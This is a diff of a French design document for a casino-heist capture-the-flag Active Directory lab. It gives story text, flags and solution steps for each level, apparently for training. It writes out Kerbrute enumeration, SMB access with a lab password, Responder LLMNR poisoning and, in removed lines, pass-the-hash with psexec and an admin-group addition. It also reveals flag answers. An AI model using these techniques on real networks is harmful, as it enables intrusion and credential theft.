@@ -216,14 +216,15 @@ Attaque :
 
 lancer un nmap pour que la personne connaissent son réseaux qui répondent 
 
-nmap -Pn -p- -sV -sC 192.168.1.0/24
+nmap -Pn -p- -sV -sC 10.X.0.111/24
 
 ping IP SRV (vu en nmap) => Permet de voir TTL 127 donc WinSRV
 
 
 Key ctf = 127 + Année du Windows Server
 
-Message réussite niveau : 
+Message réussite niveau : Bravo ! Votre balayage Nmap a porté ses fruits : vous avez découvert qu’un des serveurs du casino tourne sous Windows Server 2016, comme l’indique le TTL 127 relevé lors du ping. En combinant ce TTL avec l’année du système d’exploitation (127 + 2016), vous obtenez la clé CTF : 1272016.
+
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Level 2 Trouver les user :
@@ -231,13 +232,23 @@ Level 2 Trouver les user :
 
 Script pour histoire du niveau :
 
+Après avoir cartographié l’infrastructure du casino grâce à NMAP. Votre équipe se retrouve face à un nouveau défi : pénétrer le cœur de l’Active Directory pour dénicher les identifiants des employés et des comptes de services.
+
+Grâce aux informations récoltées au niveau 1, vous savez désormais quels serveurs hébergent le rôle de contrôleur de domaine et comment la topologie du réseau est organisée. Mais pour progresser et obtenir un accès privilégié, il vous faut d’abord dresser une liste des comptes Active Directory susceptibles d’être utilisés dans l’environnement Bellagio.local.
+
+Un de vos contacts au sein du service IT, toujours sous l’effet des « encouragements » financiers de la bande, a réussi à récupérer un fichier brut : une liste d’environ 1 000 noms d’utilisateurs utilisés pour le support interne et les services automatisés. Vous téléchargez discrètement ce fichier puis l’analysez pour en extraire les comptes potentiellement valides.
+
 Attaque : 
 
 Avoir une liste de user pour réaliser un bruteforce sur les username. Pour cela, on peut fournir une liste d'user à l'utilisateur qui peut telechagrer depuis le site web avec 1000 username afin de bruteforce et on met par exemple 5 username valides.
 
 kerbrute userenum --dc $IPDC$ -d $NOMDOMAINE$ users.txt
 
+FLAG : svc-bella
+
 Mettre dans list_recup.txt les noms recuperes
+
+Message réussite niveau : Félicitations ! Grâce à votre liste de 1 000 noms d’utilisateur et votre script Kerbrute, vous avez identifié 1 comptes AD valides dans le domaine bellagio.local (les noms figurent désormais dans list_recup.txt). En particulier, vous avez mis la main sur le compte svc-bella, qui correspond au flag du niveau 2.
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -249,7 +260,7 @@ Après avoir réussi à cartographier le réseau du casino grâce à votre exper
 
 Terry Benedicta sous-estimé une faille cruciale dans son système de sécurité informatique. Les comptes de service de son réseau Active Directory n'ont pas de pré-authentification requise, une vulnérabilité connue sous le nom d'ASREP-Roasting.
 
-Votre objectif est de récupérer les hashs des mots de passe des utilisateurs pour permettre à l'équipe d'Ocean de récuperer ces comptes et de prendre le contrôle des comptes nécessaires pour désactiver les systèmes de sécurité des casinos.
+Votre objectif est de récupérer le hashs des mots de passe de l'utilisateur précédemment trouvé pour permettre à l'équipe d'Ocean de récuperer ces comptes et de prendre le contrôle des comptes nécessaires pour désactiver les systèmes de sécurité des casinos.
 
 
 Attaque : 
@@ -274,47 +285,29 @@ Message réussite niveau :
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-Level 4 (A ESSAYER ) : Attaque via le lien de confiance et empoisonnement SMB/LLMNR
+Level 4 : Attaque via le lien de confiance et empoisonnement SMB/LLMNR
 
 Script pour histoire du niveau :
 
-Grâce à votre compte SVC-bella sur le domaine bellagio.local, vous découvrez qu’un trust existe avec le domaine casino..com. Muni de vos privilèges, vous pouvez monter le partage \ITServer-Mirage\backups, utilisé pour les sauvegardes régulières.
+Grâce à votre compte SVC-bella sur le domaine bellagio.local, Maintenant tu peux donc effectuer une recherche ldap pour connaitre le ou les différents lien de confiance qui sont liés a cet AD. (ldapsearch -H ldap://10.100.0.111 -D "bellagio\svc-bella" -W -x -b "DC=bellagio,DC=local" >> ldapsearch.txt)
 
-En explorant ce répertoire, vous tombez sur un fichier lastconn.txt, mis à jour chaque minute par un service de l’autre domaine pour y inscrire la date et l’heure de sa dernière connexion. Vous allez exploiter ce mécanisme pour forcer la machine distante à résoudre un nom de partage disparu, et ainsi capturer le hash NetNTLMv2 du compte qui tente de s’y reconnecter.
-
-Une fois en possession du hash, vous l’utiliserez en “pass-the-hash” pour prendre une session distante et vous garantir un accès administrateur dans le domaine Mirage, ouvrant la voie au sabotage complet des backups et à la mise hors ligne des systèmes de secours.
-
+Grace a toutes ces informations tu peux par exemple t'interesser au partage samba en utilisant le client samba de exegol...
 
 Attaque : 
 
-Monter le partage SMB de l’autre AD
+smbmap -H "10.100.0.111" -d bellagio.com -u 'svc-bella' -p 'P@ssw0rd'
 
-smbclient \\\\ITServer-Mirage.casino.mirage.com\\backups \
-  -U ITAdmin-Bellagio
+Lire le fichier de log et le pentester ce rend compte que toutes les 5min un utilisateur se connecte et execute un script toutes les 5 minutes (taches planifiées) 
 
-  Forcer la requête de reconnection
-smb: \> rm -r backup_data
+smbclient //10.100.0.111/script -U 'bellagio\svc-bella%P@ssw0rd'
 
-Lancer le poison LLMNR/NBNS pour capturer le hash
+Modifier le nom de domaine dans le fichier du script 111_script_smb.ps1
 
-responder -I eth0 -wrf
+Lancer responder qui empoisonnera les réponses LLMNR Netbios et qui récupèrent le hash du compte. 
 
-Extraire le hash capturé
+responder -i ens18
 
-grep "SMB-NTLMv2" /usr/share/responder/logs/Responder-Session.log \
-  | awk '{print $NF}' > captured_hash.txt
-  
-
-  Pass-the-hash vers la machine ITServer-Mirage
-psexec.py -hashes :`cat captured_hash.txt` \
-  BackupUser-Mirage@ITServer-Mirage.casino.mirage.com
-
-  Ajouter votre compte pentester au groupe Administrators local
-
-net localgroup Administrators pentester /add
-
-
-Voici une idée de flag, basé sur le hash NetNTLMv2 capturé, sans faire appel au sAMAccountName :
+Voici une idée de flag, basé sur le hash NetNTLMv2 capturé :
 
 Flag (à soumettre) :
 
